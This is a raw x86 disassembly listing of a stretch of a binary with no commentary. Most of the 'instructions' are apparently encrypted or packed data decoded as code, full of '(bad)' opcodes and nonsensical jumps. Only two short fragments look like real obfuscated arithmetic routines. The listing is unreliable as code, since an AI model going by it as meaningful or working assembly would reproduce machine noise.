  405199:	mov    bl,0x83
  40519b:	fwait
  40519c:	push   esi
  40519d:	and    DWORD PTR [eax+edi*8-0x3ab65ddd],esp
  4051a4:	xlat   BYTE PTR ds:[ebx]
  4051a5:	bound  eax,QWORD PTR [ecx]
  4051a7:	out    dx,eax
  4051a8:	push   esp
  4051a9:	push   ebp
  4051aa:	pop    esp
  4051ab:	loope  0x4051fc
  4051ad:	xchg   esi,eax
  4051ae:	aam    0x52
  4051b0:	push   es
  4051b1:	lods   eax,DWORD PTR ds:[esi]
  4051b3:	cmp    BYTE PTR [ecx],0xda
  4051b6:	mov    dh,0xce
  4051b8:	mov    ch,0x3c
  4051ba:	shl    ecx,0x48
  4051bd:	dec    edx
  4051be:	mov    ecx,DWORD PTR gs:[ecx-0x56f4d4ff]
  4051c5:	popa   
  4051c6:	sub    cl,BYTE PTR [edx]
  4051c8:	mov    gs,WORD PTR [ebx]
  4051ca:	cmp    DWORD PTR [eax],ebx
  4051cc:	rcr    BYTE PTR [eax-0x283e94e3],1
  4051d2:	cmc    
  4051d3:	push   edi
  4051d4:	iret   
  4051d5:	add    ebx,DWORD PTR [ecx-0x7cc4f054]
  4051db:	adc    DWORD PTR [edx-0x70],edx
  4051de:	pop    esp
  4051df:	dec    eax
  4051e0:	sbb    DWORD PTR [ebx],ecx
  4051e2:	push   es
  4051e3:	xor    eax,0xa80b4528
  4051e8:	hlt    
  4051e9:	mov    eax,0xfafd7838
  4051ee:	(bad)  
  4051ef:	mov    cl,0x60
  4051f1:	mov    ds:0x1d6ef635,al
  4051f6:	or     dl,BYTE PTR [edi]
  4051f8:	xchg   esi,eax
  4051f9:	data16 aam 0x74
  4051fc:	ins    DWORD PTR es:[edi],dx
  4051fd:	cld    
  4051fe:	arpl   WORD PTR [ebx],cx
  405200:	push   ds
  405201:	push   ebp
  405202:	fld    QWORD PTR [ecx-0x5f]
  405205:	inc    ecx
  405206:	enter  0x41be,0x14
  40520a:	and    eax,ebx
  40520c:	ret    
  40520d:	mov    bl,0x62
  40520f:	and    edx,DWORD PTR [eax]
  405211:	icebp  
  405212:	dec    ecx
  405213:	xchg   ecx,eax
  405214:	mov    al,ds:0x9c197d1d
  405219:	sub    ch,BYTE PTR [edx]
  40521b:	xchg   ebx,eax
  40521c:	adc    ah,BYTE PTR [esi+0x7]
  40521f:	push   0x4a
  405221:	arpl   WORD PTR [ebp+0x19],di
  405224:	adc    BYTE PTR [ecx-0x14],dl
  405227:	and    al,0xc0
  405229:	xor    edx,ebx
  40522b:	fldenv [ecx-0x6699151]
  405231:	xchg   edx,eax
  405232:	mov    esp,0x45b45500
  405237:	or     esp,DWORD PTR [esp+ebp*4+0x7d]
  40523b:	je     0x4051ed
  40523d:	inc    esi
  40523e:	dec    ebx
  40523f:	mov    esp,0x5c91413d
  405244:	push   ecx
  405245:	or     edi,ebp
  405247:	stos   DWORD PTR es:[edi],eax
  405248:	cs (bad) 
  40524a:	push   eax
  40524b:	(bad)  
  40524d:	mov    ch,0x5b
  40524f:	push   esi
  405250:	fiadd  DWORD PTR [edi+0x37ead0ed]
  405256:	and    bh,0xa2
  405259:	mov    esp,0x3a755513
  40525e:	stc    
  40525f:	daa    
  405260:	sbb    eax,0x27bf306b
  405265:	scas   al,BYTE PTR es:[edi]
  405266:	outs   dx,BYTE PTR ds:[esi]
  405267:	xlat   BYTE PTR ds:[ebx]
  405268:	popf   
  405269:	int3   
  40526a:	adc    DWORD PTR [edx-0x62],0x25aba941
  405271:	lods   al,BYTE PTR ds:[esi]
  405272:	rol    BYTE PTR [ebp+0x2f],cl
  405275:	or     eax,0xc8fde906
  40527a:	mov    ebp,0xac71d44c
  40527f:	push   esp
  405280:	push   eax
  405281:	cmc    
  405282:	es dec edx
  405284:	scas   al,BYTE PTR es:[edi]
  405285:	mov    ?,WORD PTR [ecx+0x7f181848]
  40528b:	jp     0x4052c0
  40528d:	mov    cs,WORD PTR [ebp+0x4a]
  405290:	fcomp  DWORD PTR [esp+esi*1]
  405293:	ds mov ch,0xe1
  405296:	push   eax
  405297:	test   al,0xa0
  405299:	dec    ecx
  40529a:	push   ecx
  40529b:	push   cs
  40529c:	lock fldenv [ebp+0x1f]
  4052a0:	cmp    DWORD PTR [ebx],edi
  4052a2:	mov    WORD PTR [esi+0x4a],?
  4052a5:	ficom  DWORD PTR ds:0x738b4d76
  4052ab:	xchg   ebx,eax
  4052ac:	pop    edx
  4052ad:	or     esp,DWORD PTR [ebx-0x1202f1e5]
  4052b3:	in     al,dx
  4052b4:	xchg   ebp,esi
  4052b6:	nop
  4052b7:	mov    eax,0xa9eb9b37
  4052bc:	xor    eax,0x8a1b0294
  4052c1:	popf   
  4052c2:	and    ebx,DWORD PTR [eax+0x3d410030]
  4052c8:	mov    ebx,0xfc07d7e
  4052cd:	les    ebx,FWORD PTR ds:0x745cf873
  4052d3:	aas    
  4052d4:	push   ebp
  4052d5:	clc    
  4052d6:	jmp    0x4052a3
  4052d8:	pop    esi
  4052d9:	and    eax,0x5678dec3
  4052de:	and    esp,0x64c8ced1
  4052e4:	imul   esi,DWORD PTR [edi],0x34c2eb39
  4052ea:	jl     0x40530b
  4052ec:	mov    ecx,0xf7d6819d
  4052f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052f2:	cs mov ecx,0x59c523c8
  4052f8:	push   esi
  4052f9:	retf   
  4052fa:	inc    edx
  4052fb:	add    DWORD PTR [esp+eiz*4+0x50],ebx
  4052ff:	or     BYTE PTR [edi+0x46ff82cc],al
  405305:	mov    eax,0x3537b3f7
  40530a:	mov    WORD PTR [edx],es
  40530c:	mov    DWORD PTR [esi],edx
  40530e:	dec    esi
  40530f:	repz pop ecx
  405311:	jecxz  0x405298
  405313:	and    al,0xd0
  405315:	(bad)  
  405316:	xchg   esp,eax
  405317:	adc    al,0x69
  405319:	addr16 addr16 arpl sp,bp
  40531d:	(bad)  
  40531e:	sti    
  40531f:	inc    edx
  405320:	dec    ebx
  405321:	pop    ebp
  405322:	mov    esi,ebx
  405324:	xchg   DWORD PTR [ebp-0x4b],eax
  405327:	repz int3 
  405329:	mov    esi,0xc0029fb1
  40532e:	retf   0x935d
  405331:	and    BYTE PTR [ebx+edi*1+0x3a2322ce],ah
  405338:	lock test eax,0xa0bdbe74
  40533e:	shr    BYTE PTR [edi+edi*2-0x4fea3acb],1
  405345:	jns    0x40531f
  405347:	xlat   BYTE PTR ds:[ebx]
  405348:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405349:	(bad)  
  40534a:	addr16 dec ebp
  40534c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40534d:	and    eax,0xaf8da388
  405352:	imul   edi,DWORD PTR [ebp+0x17],0x6c304d2b
  405359:	mov    ch,0x25
  40535b:	xchg   ebx,eax
  40535c:	rol    BYTE PTR [ebp+esi*4-0x5bb8508],0xc4
  405364:	lods   eax,DWORD PTR ds:[esi]
  405365:	in     eax,0x7e
  405367:	scas   eax,DWORD PTR es:[edi]
  405368:	into   
  405369:	and    ch,BYTE PTR [ecx]
  40536b:	shl    dh,0x1e
  40536e:	sub    eax,0xd624c6b9
  405373:	in     eax,dx
  405374:	add    BYTE PTR ds:0x6b7dd5e6,cl
  40537a:	bound  ebx,QWORD PTR [edi+0x5369e44e]
  405380:	add    ecx,ebp
  405382:	mov    al,dh
  405384:	mov    ebp,0x910df1cf
  405389:	ja     0x405355
  40538b:	loopne 0x405324
  40538d:	and    eax,0xe2366ca8
  405392:	push   ds
  405393:	ss sti 
  405395:	cmp    ecx,DWORD PTR [edi]
  405397:	push   ds
  405398:	cli    
  405399:	dec    ebx
  40539a:	inc    esi
  40539b:	and    BYTE PTR [edi-0x2d],cl
  40539e:	cwde   
  40539f:	sbb    BYTE PTR [ebx-0x6d],bh
  4053a2:	mov    eax,fs:0x734a4ca1
  4053a8:	sub    bl,BYTE PTR [ecx+0x4c]
  4053ab:	lock dec esp
  4053ad:	xor    dh,ch
  4053af:	inc    ecx
  4053b0:	iret   
  4053b1:	mov    dl,0x78
  4053b3:	fcmovb st,st(0)
  4053b5:	push   es
  4053b6:	mov    bl,BYTE PTR [edi-0x5582dcc9]
  4053bc:	pop    ds
  4053bd:	bnd jno 0x4053fe
  4053c0:	(bad)  
  4053c1:	jmp    0x96418fe2
  4053c6:	pop    eax
  4053c7:	mov    bl,0x22
  4053c9:	jbe    0x405422
  4053cb:	dec    esi
  4053cc:	xchg   edi,eax
  4053cd:	jo     0x405428
  4053cf:	cli    
  4053d0:	test   DWORD PTR [ebx+0x7c5d990f],esp
  4053d6:	cmp    ah,BYTE PTR [ebx-0x8]
  4053d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053da:	mov    ebp,0x4a003ac7
  4053df:	dec    edx
  4053e0:	mov    DWORD PTR ss:[esi],ecx
  4053e3:	ja     0x4053aa
  4053e5:	ins    DWORD PTR es:[edi],dx
  4053e6:	pop    esi
  4053e7:	xor    eax,0xefaba96e
  4053ec:	xchg   edx,edi
  4053ee:	loope  0x4053a7
  4053f0:	jmp    0x68ad336a
  4053f5:	or     eax,0xa6d0bcf0
  4053fa:	mov    ds:0x6c4a6ea0,al
  4053ff:	cdq    
  405400:	push   0xc018d42c
  405405:	adc    ah,dl
  405407:	imul   esi,DWORD PTR [edx-0x44],0xffffffea
  40540b:	mov    eax,ds:0xcdf055dd
  405410:	ret    0x68b3
  405413:	push   ecx
  405414:	xchg   edx,eax
  405415:	or     DWORD PTR [ebp+0x5271af61],ebx
  40541b:	pop    es
  40541c:	pop    edx
  40541d:	cwde   
  40541e:	adc    BYTE PTR [edi],0x1c
  405421:	push   ds
  405422:	clc    
  405423:	push   cs
  405424:	xchg   DWORD PTR [esi+0x205533a8],edx
  40542a:	push   0x6
  40542c:	push   esp
  40542d:	je     0x405410
  40542f:	push   ecx
  405430:	push   0xb5746079
  405435:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405436:	arpl   WORD PTR [esi+0x36],bp
  405439:	cmp    al,0x9e
  40543b:	xor    esp,DWORD PTR [ecx+0x42]
  40543e:	cmp    al,0x71
  405440:	sbb    al,0x5c
  405442:	retf   
  405443:	cmp    ecx,esi
  405445:	jae    0x4053ea
  405447:	aad    0x5a
  405449:	cmp    al,0x77
  40544b:	daa    
  40544c:	fmul   st,st(4)
  40544e:	push   ebp
  40544f:	fmulp  st(2),st
  405451:	lds    edi,FWORD PTR [ecx+ebp*1+0x53]
  405455:	mov    ah,0xb1
  405457:	dec    esp
  405458:	inc    eax
  405459:	inc    DWORD PTR [eax-0x64]
  40545c:	imul   edi,ebx,0xeb986391
  405462:	dec    edx
  405463:	cmp    edi,edx
  405465:	jbe    0x404ac0
  40546b:	mov    edx,DWORD PTR [ebp-0xc]
  40546e:	mov    edi,DWORD PTR [ebp-0x24]
  405471:	jmp    0x405774
  405476:	outs   dx,DWORD PTR ds:[esi]
  405477:	fisttp QWORD PTR [esi+0x6f6d8cef]
  40547d:	pop    ebp
  40547e:	fmul   QWORD PTR [edi-0x449a0448]
  405484:	mov    ebx,0x7e2bd0b7
  405489:	jle    0x4054e3
  40548b:	jl     0x40550b
  40548d:	jle    0x40543c
  40548f:	js     0x4054ac
  405491:	enter  0xcc74,0xce
  405495:	and    BYTE PTR [edx-0x48c8c754],bl
  40549b:	(bad)  
  40549c:	je     0x405457
  40549e:	sub    DWORD PTR [edi-0x3],esi
  4054a1:	js     0x405480
  4054a3:	jo     0x40542a
  4054a5:	aaa    
  4054a6:	pop    ebp
  4054a7:	xchg   edx,eax
  4054a8:	aam    0xd1
  4054aa:	dec    edi
  4054ab:	shr    al,cl
  4054ad:	les    ebx,FWORD PTR [edx+edx*8+0x4cb90cca]
  4054b4:	es dec esi
  4054b6:	mov    bl,bl
  4054b8:	xor    edi,ebp
  4054ba:	ret    
  4054bb:	fs pop esp
  4054bd:	xchg   edx,eax
  4054be:	aad    0xbf
  4054c0:	mov    al,ds:0x4728f40
  4054c5:	pop    ecx
  4054c6:	inc    ebx
  4054c7:	fisttp DWORD PTR [esi+edi*2-0x4f]
  4054cb:	push   es
  4054cc:	vdivss xmm1,xmm2,DWORD PTR [ebx+0x456a878e]
  4054d4:	imul   ecx,DWORD PTR [ebx+0x54453e2f],0xffffffd0
  4054db:	out    0x3f,eax
  4054dd:	xchg   edi,eax
  4054de:	add    dl,dl
  4054e0:	(bad)  
  4054e1:	mov    ds:0xa4190450,al
  4054e6:	sub    al,0xfe
  4054e8:	sbb    eax,0x705f7324
  4054ed:	pop    si
  4054ef:	xor    bl,BYTE PTR [ecx]
  4054f1:	(bad)
  4054f4:	xor    esp,DWORD PTR [ecx]
  4054f6:	inc    esp
  4054f7:	sub    dl,BYTE PTR [edi+0x3c]
  4054fa:	dec    esp
  4054fb:	mov    bh,0xd5
  4054fd:	sub    DWORD PTR [ebx-0x71f05187],0x2ddb2256
  405507:	adc    eax,0x562a4ebd
  40550c:	and    cl,BYTE PTR [ebx-0xd]
  40550f:	or     dh,al
  405511:	pop    eax
  405512:	cld    
  405513:	add    BYTE PTR [esi+eax*1],0xef
  405517:	cdq    
  405518:	pop    ebp
  405519:	pusha  
  40551a:	mov    ss,WORD PTR [edx-0x76bd2024]
  405520:	mov    al,BYTE PTR [edi+0x5b]
  405523:	ins    BYTE PTR es:[edi],dx
  405524:	in     eax,0x9b
  405526:	nop
  405527:	mov    eax,ds:0x85e24a4b
  40552c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40552d:	(bad)  
  40552e:	in     eax,0xd8
  405530:	cmp    cl,al
  405532:	jl     0x40554a
  405534:	push   esp
  405535:	out    0x38,eax
  405537:	ret    0x8862
  40553a:	retf   
  40553b:	inc    ebp
  40553c:	shl    DWORD PTR [ebx-0x42],0xba
  405540:	xchg   esp,eax
  405541:	rol    DWORD PTR [edi+0x5e],1
  405544:	out    0xdf,eax
  405546:	lods   eax,DWORD PTR ds:[esi]
  405547:	sbb    bl,BYTE PTR [esi]
  405549:	ins    DWORD PTR es:[edi],dx
  40554a:	sbb    al,0xe9
  40554c:	sbb    BYTE PTR [edx-0xa7f47cc],bh
  405552:	clc    
  405553:	inc    ebx
  405554:	pop    esp
  405555:	jg     0x4054ea
  405557:	ins    DWORD PTR es:[edi],dx
  405558:	out    dx,al
  405559:	sub    al,0xbd
  40555b:	rcl    BYTE PTR [ebx+0x26],1
  40555e:	mov    BYTE PTR [eax-0x72],bh
  405561:	ins    BYTE PTR es:[edi],dx
  405562:	jecxz  0x40555a
  405564:	fcom   DWORD PTR [ecx+ecx*8]
  405567:	xchg   BYTE PTR [esi-0x1d5e624],cl
  40556d:	(bad)  
  40556e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40556f:	push   edx
  405570:	mov    ss,WORD PTR [ebx+0x289bef05]
  405576:	std    
  405577:	call   0x22b0:0x9cf1f9ea
  40557e:	dec    eax
  40557f:	fistp  QWORD PTR [ecx-0x22]
  405582:	add    ebp,DWORD PTR [ebp-0x7e]
  405585:	pop    ss
  405586:	mov    cl,0xa
  405588:	addr16 gs std 
  40558b:	mov    WORD PTR [eax+ebx*4+0x5ccbe96e],fs
  405592:	shr    BYTE PTR [ebp-0xfef5081],1
  405598:	pop    esp
  405599:	ins    DWORD PTR es:[edi],dx
  40559a:	popf   
  40559b:	jnp    0x4055ca
  40559d:	xchg   BYTE PTR [edx],cl
  40559f:	xor    edi,DWORD PTR [edx+0x141bfc45]
  4055a5:	data16 test BYTE PTR [edx],0x43
  4055a9:	outs   dx,DWORD PTR ds:[esi]
  4055aa:	add    ah,BYTE PTR [ebx+0x4c74de4a]
  4055b0:	imul   ecx,DWORD PTR [ecx+0x146651fd],0x1a
  4055b7:	sub    eax,0x92dad6a2
  4055bc:	leave  
  4055bd:	popa   
  4055be:	mov    ebp,0xbdbd735b
  4055c3:	aaa    
  4055c4:	addr16 xchg edx,eax
  4055c6:	xor    BYTE PTR [ecx],ch
  4055c8:	fwait
  4055c9:	je     0x40558a
  4055cb:	jmp    0x405602
  4055cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055ce:	mov    ebp,0x9fe9df0f
  4055d3:	push   ebp
  4055d4:	push   eax
  4055d5:	jecxz  0x40562e
  4055d7:	stos   DWORD PTR es:[edi],eax
  4055d8:	fucomi st,st(4)
  4055da:	dec    eax
  4055db:	mov    ch,0x7
  4055dd:	xchg   ebx,eax
  4055de:	adc    al,0xeb
  4055e0:	dec    edx
  4055e1:	dec    esp
  4055e2:	mov    ch,0xd1
  4055e4:	test   al,0x61
  4055e6:	or     eax,eax
  4055e8:	pop    ecx
  4055e9:	cmp    BYTE PTR cs:[ebx+ebp*1-0xf01d647],dl
  4055f1:	jno    0x4055b9
  4055f3:	sub    edx,DWORD PTR [esi+0x1f]
  4055f6:	outs   dx,BYTE PTR ds:[esi]
  4055f7:	mov    dh,0x37
  4055f9:	mov    esp,0x1635d749
  4055fe:	cmp    DWORD PTR [edx+edx*1+0x1b5f3026],esi
  405605:	adc    edi,ecx
  405607:	fidivr WORD PTR [esi+ecx*8]
  40560a:	sbb    eax,0xb46844d8
  40560f:	mov    bl,0xe1
  405611:	mov    cl,0xa2
  405613:	jmp    0x65ac:0x391a968e
  40561a:	scas   eax,DWORD PTR es:[edi]
  40561b:	pop    ecx
  40561c:	push   ebx
  40561d:	sbb    ebx,edx
  40561f:	cmp    edi,0x57
  405622:	sbb    al,0xf2
  405624:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405625:	stos   BYTE PTR es:[edi],al
  405626:	or     edi,DWORD PTR [ebx-0x18aa03c4]
  40562c:	cmp    eax,0x48
  40562f:	dec    edi
  405630:	lea    ebx,[ebp-0x2332031b]
  405636:	dec    esp
  405637:	popf   
  405638:	pop    ss
  405639:	das    
  40563a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40563b:	push   ebp
  40563c:	xor    al,0x40
  40563e:	push   0xffffffbf
  405640:	xor    edx,DWORD PTR [edx+0x62]
  405643:	retf   
  405644:	dec    esi
  405645:	mov    ah,0x76
  405647:	(bad)  
  405648:	push   0xffffffbf
  40564a:	leave  
  40564b:	jmp    0x405693
  40564d:	pop    esp
  40564e:	inc    esi
  40564f:	sbb    eax,0xd699d42a
  405654:	loop   0x4056b6
  405656:	add    DWORD PTR [edx+0x5d],esp
  405659:	fs cmp eax,0xbc2e4990
  40565f:	mov    ?,WORD PTR [ecx+0x43]
  405662:	pop    esi
  405663:	(bad)  
  405665:	stos   DWORD PTR es:[edi],eax
  405666:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405667:	loopne 0x405612
  405669:	pop    ecx
  40566a:	sbb    BYTE PTR [edi+0x24],dh
  40566d:	xor    BYTE PTR [ebx+0x2],cl
  405670:	fsubr  DWORD PTR [ebp-0x60]
  405673:	cmp    BYTE PTR ds:0xe5dac693,ah
  405679:	push   es
  40567a:	and    DWORD PTR [ebp-0x43],esp
  40567d:	call   FWORD PTR [esi+0x4c76de4a]
  405683:	and    al,0x8d
  405685:	cs leave 
  405687:	dec    edx
  405688:	xchg   BYTE PTR [edx],dh
  40568a:	sbb    al,BYTE PTR [edi]
  40568c:	iret   
  40568d:	pop    ds
  40568e:	outs   dx,DWORD PTR ds:[esi]
  40568f:	adc    DWORD PTR [ecx-0x3],ecx
  405692:	shr    BYTE PTR [ecx+0x70],cl
  405695:	out    0x81,al
  405697:	rol    DWORD PTR ds:0xa8bcc61b,1
  40569d:	add    esi,0x25a00118
  4056a3:	sub    eax,0xbcc34d56
  4056a8:	push   ebx
  4056a9:	mov    edx,0xb7a8d94f
  4056ae:	add    BYTE PTR ds:[ebp-0xa030b4e],bl
  4056b5:	mov    eax,0xfd9475a9
  4056ba:	sbb    eax,0x79927f55
  4056bf:	jecxz  0x405688
  4056c1:	pop    ecx
  4056c2:	arpl   WORD PTR [ecx],sp
  4056c4:	and    al,0x7f
  4056c6:	(bad)  
  4056c8:	inc    edx
  4056c9:	xor    ecx,DWORD PTR [edx+0x35]
  4056cc:	lods   al,BYTE PTR ds:[esi]
  4056cd:	sbb    DWORD PTR [edi-0x2d98c916],ebp
  4056d3:	sbb    al,0xb8
  4056d5:	ret    0xecf3
  4056d8:	inc    ecx
  4056d9:	push   edx
  4056da:	push   edx
  4056db:	mov    ?,esi
  4056dd:	adc    eax,0x22395914
  4056e2:	or     eax,0x86b0c02d
  4056e7:	jo     0x4056f0
  4056e9:	aaa    
  4056ea:	loop   0x405716
  4056ec:	dec    ecx
  4056ed:	(bad)  
  4056ef:	fisubr WORD PTR [bx+di+0x7900]
  4056f4:	jmp    0x40571b
  4056f6:	mov    bl,0x1b
  4056f8:	sbb    dl,BYTE PTR [ecx-0xd]
  4056fb:	test   dl,cl
  4056fd:	arpl   WORD PTR [esi],ax
  4056ff:	xor    dl,BYTE PTR [eax-0x1a75fd6c]
  405705:	mov    edx,0x3fac2a88
  40570a:	add    ebp,DWORD PTR [eax]
  40570c:	sub    bl,BYTE PTR [ecx+0x3cd1d778]
  405712:	inc    esp
  405713:	addr16 push esp
  405715:	lock (bad) 
  405717:	retf   
  405718:	xchg   ebp,eax
  405719:	jo     0x405787
  40571b:	mov    bh,0xdb
  40571d:	cmp    dh,BYTE PTR [ecx-0x27]
  405720:	(bad)  
  405722:	push   cs
  405723:	fcomip st,st(1)
  405725:	mov    al,0x16
  405727:	fs jp  0x4056f4
  40572a:	shr    DWORD PTR [eax-0x558bd440],cl
  405730:	hlt    
  405731:	push   esp
  405732:	inc    edi
  405733:	popf   
  405734:	sti    
  405735:	call   0x183fd4a2
  40573a:	and    DWORD PTR [eax-0x65],ecx
  40573d:	scas   eax,DWORD PTR es:[edi]
  40573e:	je     0x40576b
  405740:	add    DWORD PTR [ebx+0x1d],ebp
  405743:	push   ds
  405744:	in     eax,dx
  405745:	mov    edi,0xbb3f3e20
  40574a:	xchg   ebp,eax
  40574b:	push   ds
  40574c:	data16 das 
  40574e:	sub    eax,0x7a159e72
  405753:	jecxz  0x405710
  405755:	jbe    0x405762
  405757:	int    0xcb
  405759:	push   esp
  40575a:	out    0x22,eax
  40575c:	out    dx,al
  40575d:	cmp    eax,0x6312e801
  405762:	pop    edx
  405763:	push   0x59b99388
  405768:	sub    ebx,DWORD PTR [edi+0x7b]
  40576b:	xchg   ebx,eax
  40576c:	enter  0x416f,0x5b
  405770:	rcr    ebp,cl
  405772:	cmp    BYTE PTR [ebx+esi*1+0xfd103d0],al
  405779:	scas   eax,DWORD PTR es:[edi]
  40577a:	xlat   BYTE PTR ds:[ebx]
  40577b:	mov    edi,DWORD PTR [ebp-0x18]
  40577e:	xor    edi,eax
  405780:	add    edx,edi
  405782:	mov    edi,DWORD PTR [ebp-0x8]
  405785:	lea    edx,[edx+edi*1+0x32729b]
  40578c:	mov    DWORD PTR [ebp-0x8],edx
  40578f:	mov    edx,DWORD PTR [ebp-0x20]
  405792:	xor    edx,eax
  405794:	mov    edi,0xffcd8d65
  405799:	sub    edi,edx
  40579b:	add    edi,DWORD PTR [ebp-0x10]
  40579e:	mov    edx,DWORD PTR [ebp-0x20]
  4057a1:	mov    ebx,DWORD PTR [ebp-0x8]
  4057a4:	xor    edx,eax
  4057a6:	add    edx,ecx
  4057a8:	imul   edx,ebx
  4057ab:	cmp    edx,edi
  4057ad:	jbe    0x4038ea
  4057b3:	pop    ebx
  4057b4:	pop    edi
  4057b5:	leave  
  4057b6:	ret    0x8
  4057b9:	push   ebp
  4057ba:	mov    ebp,esp
  4057bc:	push   ecx
  4057bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4057c0:	and    eax,DWORD PTR ds:0x43379b
  4057c6:	mov    eax,0x7510854
  4057cb:	xor    DWORD PTR ds:0x4336a3,0x433683
  4057d5:	xor    ecx,eax
  4057d7:	not    DWORD PTR ds:0x4336df
  4057dd:	add    ecx,0x32729b
  4057e3:	jmp    0x405b32
  4057e8:	scas   eax,DWORD PTR es:[edi]
  4057e9:	inc    BYTE PTR [ebp-0x39]
  4057ec:	jne    0x4057b3
  4057ee:	lods   eax,DWORD PTR ds:[esi]
  4057ef:	jbe    0x4057a1
  4057f1:	loopne 0x4057f0
  4057f3:	mov    al,0x59
  4057f5:	add    cl,BYTE PTR [ecx]
  4057f7:	add    eax,0x7e7e363a
  4057fc:	sub    al,0x7d
  4057fe:	jle    0x40587e
  405800:	sub    DWORD PTR [ecx+ebx*2],ebx
  405803:	pop    es
  405804:	pop    esp
  405805:	mov    al,0x45
  405807:	leave  
  405808:	jo     0x405866
  40580a:	inc    edi
  40580b:	popf   
  40580c:	es xchg esi,eax
  40580e:	fidivr DWORD PTR gs:[ebp+0x4]
  405812:	dec    ebp
  405813:	xchg   ecx,eax
  405814:	dec    esp
  405815:	mov    ebp,0x58497071
  40581a:	idiv   DWORD PTR ds:0x6bc1afb3
  405820:	cmc    
  405821:	inc    edi
  405822:	mov    eax,0xa35cd069
  405827:	pop    esi
  405828:	test   DWORD PTR [ebx+0x38],0x618df73c
  40582f:	adc    eax,0xba6dd3f3
  405834:	icebp  
  405835:	(bad)  
  405836:	sti    
  405837:	neg    DWORD PTR [ecx-0x72074035]
  40583d:	nop
  40583e:	sub    ebx,DWORD PTR [ecx+0xe]
  405841:	stos   BYTE PTR es:[edi],al
  405842:	retf   0xdbed
  405845:	inc    edx
  405846:	test   DWORD PTR [ebx+0x2f],eax
  405849:	aam    0x12
  40584b:	push   ds
  40584c:	jp     0x40588a
  40584e:	jge    0x405821
  405850:	sub    eax,0x6d58ec5
  405855:	fdiv   DWORD PTR [edx-0x3cc338ea]
  40585b:	xchg   cl,dl
  40585d:	mov    esi,0xc6f6aae8
  405862:	xor    edx,ebx
  405864:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405865:	loop   0x405838
  405867:	xchg   ecx,eax
  405868:	cmc    
  405869:	fisttp DWORD PTR [ecx+0x75]
  40586c:	and    eax,0x4c776b1e
  405871:	retf   
  405872:	and    BYTE PTR ds:0x5024b9fa,dh
  405878:	adc    al,0x25
  40587a:	sar    dh,cl
  40587c:	xchg   ecx,eax
  40587d:	pop    eax
  40587e:	ror    BYTE PTR [edx-0x36f24e99],1
  405884:	leave  
  405885:	mov    eax,ds:0x86cf703b
  40588a:	mov    edx,0x40e6757e
  40588f:	dec    ebx
  405890:	and    eax,0xb06f5c7a
  405895:	cmp    edx,DWORD PTR [esi-0xa]
  405898:	(bad)  
  405899:	jle    0x4058c8
  40589b:	xor    DWORD PTR [edx-0x45f0e5d3],ebp
  4058a1:	or     al,0xd0
  4058a3:	ins    BYTE PTR es:[edi],dx
  4058a4:	adc    ecx,DWORD PTR [edx+0x53ed2696]
  4058aa:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4058ac:	mov    dh,0xb1
  4058ae:	imul   ebp,DWORD PTR [edx+ebx*2],0x483f2bed
  4058b5:	int    0xfe
  4058b7:	adc    esi,DWORD PTR [edi-0x49ed3c79]
  4058bd:	ror    DWORD PTR [ebx-0x18f3749d],0x6f
  4058c4:	in     eax,0x21
  4058c6:	push   es
  4058c7:	xor    eax,DWORD PTR [ecx+0x23]
  4058ca:	call   0x101f:0x9e1142aa
  4058d1:	std    
  4058d2:	mov    al,ds:0x449dfbc2
  4058d7:	sbb    al,0xe1
  4058d9:	ss jecxz 0x405909
  4058dc:	jmp    0xeec75de5
  4058e1:	add    DWORD PTR [esp+esi*8+0x3a7c2695],edi
  4058e8:	or     DWORD PTR [edx],edx
  4058ea:	xchg   edx,eax
  4058eb:	pop    edi
  4058ec:	sahf   
  4058ed:	mov    al,ds:0xc2fe4b8e
  4058f2:	xor    DWORD PTR [eax],0x9edf9f36
  4058f8:	or     al,0x61
  4058fa:	mov    ds:0x87188c0b,eax
  4058ff:	add    ebx,ebp
  405901:	pop    eax
  405902:	pop    ecx
  405903:	rcr    BYTE PTR [ebx+0x2e],0x74
  405907:	mov    ds:0xc14785ff,eax
  40590c:	mov    ds:0x8f2bd11e,al
  405911:	cdq    
  405912:	mov    ds:0xec6d7641,eax
  405917:	rcr    DWORD PTR [eax],1
  405919:	in     eax,0xcd
  40591b:	cmp    BYTE PTR [eax-0x4a],ch
  40591e:	xchg   edi,eax
  40591f:	cdq    
  405920:	jb     0x4059a0
  405922:	push   esi
  405923:	clc    
  405924:	mov    bl,0x34
  405926:	fiadd  WORD PTR [ebx-0x620d67d0]
  40592c:	addr16 icebp 
  40592e:	cs inc ecx
  405930:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405931:	add    eax,0xf67dfed6
  405936:	ret    0x6494
  405939:	and    cl,BYTE PTR [ebx+0x1a]
  40593c:	mov    ebx,0x79c18c3b
  405941:	mov    dl,0x1f
  405943:	jg     0x405928
  405945:	jno    0x40599d
  405947:	push   ebx
  405948:	add    DWORD PTR [edi+edx*2+0x1bb1c8eb],edx
  40594f:	out    0xb8,eax
  405951:	push   ecx
  405952:	xor    eax,0x828dd066
  405957:	in     al,dx
  405958:	jae    0x405996
  40595a:	jmp    0xbd2a:0xa42359d0
  405961:	mov    BYTE PTR [ebx],al
  405963:	leave  
  405964:	xchg   ebx,edx
  405966:	jecxz  0x4059e3
  405968:	out    dx,eax
  405969:	mov    eax,ds:0xd04ef370
  40596e:	aaa    
  40596f:	ja     0x4058f4
  405971:	pop    eax
  405972:	push   edx
  405973:	mov    eax,DWORD PTR [esi+0x74]
  405976:	push   ss
  405977:	or     ecx,DWORD PTR [edi-0x48]
  40597a:	jle    0x40598e
  40597c:	in     al,0x8c
  40597e:	ret    
  40597f:	mov    ecx,0x48434a4e
  405984:	(bad)  
  405985:	clc    
  405986:	ins    BYTE PTR es:[edi],dx
  405987:	into   
